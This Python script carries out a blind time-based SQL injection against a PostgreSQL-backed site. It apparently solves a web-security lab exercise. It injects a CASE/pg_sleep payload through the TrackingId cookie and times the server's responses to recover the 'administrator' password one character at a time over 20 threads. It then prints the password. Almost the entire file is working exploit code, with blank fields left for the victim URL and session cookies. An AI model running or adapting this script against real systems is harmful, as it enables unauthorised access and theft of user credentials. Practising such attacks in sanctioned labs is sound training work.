import threading
import urllib.parse
import requests
import urllib3
from termcolor import colored
from time import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#password_extracted = [__,__,__,__,__,__,__.....,__]
#                      1  2  3  4  5  6  7       n


url = "" # url victim 
track_id = "" #here your track id cookie 
session_token =  "" #here

password_extracted = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
theads_list = []
chars = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 
        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 
        'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 
        'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', 
        '4', '5', '6', '7', '8', '9']

def function_exploit_sql_injection(url, index, track_id, session_token ):
        for j in chars:
                payload = f"' || (SELECT CASE WHEN (username = 'administrator' and (substring(password, {index}, 1 ) = '{j}') ) THEN pg_sleep(10) ELSE '' END from users ) --"
                payload_encoded_to_url = urllib.parse.quote(payload)
                cookies = {
                     'TrackingId': f'{track_id}' + payload_encoded_to_url,
                     'Session': f'{session_token}'
                }
                response_from_server = requests.get(url, cookies=cookies,verify=False)
                if response_from_server.elapsed.total_seconds() > 8:
                     password_extracted[index-1] = j
                else:
                     pass
        print(colored(f"[+] extracting...<n-{index}> ", "yellow"), password_extracted)

def generate_theads():
    for i in range(1, 21):
        n_thread = threading.Thread(target=function_exploit_sql_injection, kwargs={'url': url, 'index': i, 'track_id': track_id, 'session_token': session_token})
        n_thread.start()
        theads_list.append(n_thread)
    for thread in theads_list:
          thread.join()
          
          
if __name__ == "__main__":
    generate_theads()
    pw = ''.join(password_extracted)
    print('\n')
    sleep(1.2)
    print(colored("[+] PASSWORD FOUND!", "yellow"))
    sleep(1.2)
    print(colored(f"password_administrator: ", "red"), pw)

